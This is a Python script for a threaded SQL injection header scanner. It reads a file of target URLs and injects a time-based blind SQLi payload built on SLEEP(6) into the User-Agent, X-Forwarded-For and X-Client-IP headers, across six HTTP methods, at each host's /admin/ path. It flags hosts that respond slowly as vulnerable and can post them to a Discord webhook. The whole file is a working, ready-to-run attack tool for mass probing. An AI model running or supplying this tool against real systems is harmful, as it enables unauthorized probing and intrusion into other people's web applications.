#!/usr/bin/python3

import requests
import argparse
import time
import random
import urllib3
import os
from datetime import datetime
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DISCORD_WEBHOOK = ""  # <-- Add Your Discord Webhook Here if Needed

PROXIES = {
    # "http": "http://127.0.0.1:8080",
    # "https": "http://127.0.0.1:8080"
}

payload = 'nvn"xor(if(now()=sysdate(),SLEEP(6),0))xor"nvn'

base_headers = {
    "User-Agent": "normal-useragent",
    "X-Forwarded-For": "normal-xff",
    "X-Client-IP": "normal-clientip",
    "X-Requested-With": "XMLHttpRequest",
    "Accept": "*/*"
}

headers_to_test = ["User-Agent", "X-Forwarded-For", "X-Client-IP"]
methods_to_test = ["GET", "POST", "PUT", "OPTIONS", "HEAD", "PATCH"]
timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
output_file = f"vulnerable_endpoints_{timestamp}.txt"

lock = threading.Lock()


def send_discord_alert(url, method, header, attack_headers):
    if DISCORD_WEBHOOK:
        try:
            data = {
                "content": "🚨 **SQLi Vulnerable**\n**URL:** `%s`\n**Method:** `%s`\n**Injected Header:** `%s`\n**Attack Headers:**\n```%s```" % (
                    url, method, header, "\n".join("%s: %s" % (k, v) for k, v in attack_headers.items())
                )
            }
            requests.post(DISCORD_WEBHOOK, json=data, proxies=PROXIES, verify=False)
        except Exception as e:
            with lock:
                print(Fore.YELLOW + "[!!] Discord alert failed: %s" % str(e) + Style.RESET_ALL)


def is_vulnerable(url, method, injected_header):
    try:
        headers = base_headers.copy()
        headers[injected_header] = payload

        start = time.time()

        request_func = {
            "GET": requests.get,
            "POST": requests.post,
            "PUT": requests.put,
            "OPTIONS": requests.options,
            "HEAD": requests.head,
            "PATCH": requests.patch
        }.get(method)

        if request_func:
            kwargs = {
                "headers": headers,
                "timeout": 10,
                "verify": False,
                "proxies": PROXIES
            }

            if method in ["POST", "PUT", "PATCH"]:
                kwargs["data"] = {"test": "test"}

            response = request_func(url + "/admin/", **kwargs)
            duration = time.time() - start
            return duration > 5.5, response.status_code, method
    except Exception:
        return False, None, method

    return False, None, method


def test_url(url, total, idx):
    random.shuffle(methods_to_test)
    for method in methods_to_test:
        random.shuffle(headers_to_test)
        for header in headers_to_test:
            with lock:
                print(f"\n[{idx}/{total}] {url} | Trying {method} with header {header}...")

            vulnerable, status, used_method = is_vulnerable(url, method, header)
            with lock:
                if vulnerable:
                    print(Fore.GREEN + f"  [!!] Vulnerable! {url} | Status: {status} | Method: {used_method} | Header: {header}" + Style.RESET_ALL)
                    with open(output_file, "a") as out:
                        out.write(f"{url} | {used_method} | {header}\n")
                        out.flush()
                        os.fsync(out.fileno())
                    send_discord_alert(url, used_method, header, base_headers)
                    return  # Stop further testing this URL after first vuln
                else:
                    color = Fore.RED if status else Fore.YELLOW
                    print(color + f"  [--] Not vulnerable | Status: {status if status else 'Error/Timeout'}" + Style.RESET_ALL)
            time.sleep(1)


def main(file_path, threads):
    with open(file_path, 'r') as f:
        raw_urls = [line.strip() for line in f if line.strip()]

    urls = []
    for line in raw_urls:
        if not line.startswith("http://") and not line.startswith("https://"):
            line = "https://" + line
        urls.append(line)

    random.shuffle(urls)

    print(f"\n[+] Loaded {len(urls)} targets. Scanning with {threads} threads...\n")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(test_url, url, len(urls), idx + 1) for idx, url in enumerate(urls)]
        for _ in as_completed(futures):
            pass  # Wait for all to finish

    print(f"\n[+] Scan finished. Vulnerable results saved in: {output_file}\n")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Threaded Multi-Method SQLi Header Scanner")
    parser.add_argument("-f", "--file", required=True, help="Path to file with target URLs")
    parser.add_argument("-t", "--threads", type=int, default=20, help="Number of threads (Default: 20)")
    args = parser.parse_args()
    main(args.file, args.threads)
